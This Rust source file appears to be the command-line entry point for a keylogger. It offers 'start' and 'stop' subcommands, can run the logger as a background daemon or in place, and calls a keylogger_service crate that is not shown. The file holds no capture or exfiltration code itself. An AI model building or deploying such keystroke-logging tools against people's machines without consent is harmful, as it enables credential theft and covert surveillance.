use clap::{command, Parser, Subcommand};
use keylogger_service::{create, start, stop};
use log::{error, trace};
use simplelog::{Config, LevelFilter, SimpleLogger};

#[derive(Parser)]
#[command(version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Start logging keys
    Start {
        /// Start the keylogger without creating a daemon, keylogger will be up only while the
        /// process lives
        #[arg(short, long)]
        in_place: bool,
    },
    /// Search for active keylogger and stop it
    Stop,
}

fn main() {
    if let Err(err) = SimpleLogger::init(LevelFilter::Trace, Config::default()) {
        panic!("{err:?}");
    }
    let cli = Cli::parse();

    match cli.command {
        Commands::Start { in_place: false } => {
            trace!("Creating daemon with keylogger");
            if let Err(err) = create() {
                error!("{err:?}");
            }
        }
        Commands::Start { in_place: true } => {
            trace!("Starting keylogger in place");
            start();
        }
        Commands::Stop => {
            if let Err(err) = stop() {
                error!("{err:?}");
            }
        }
    }
}
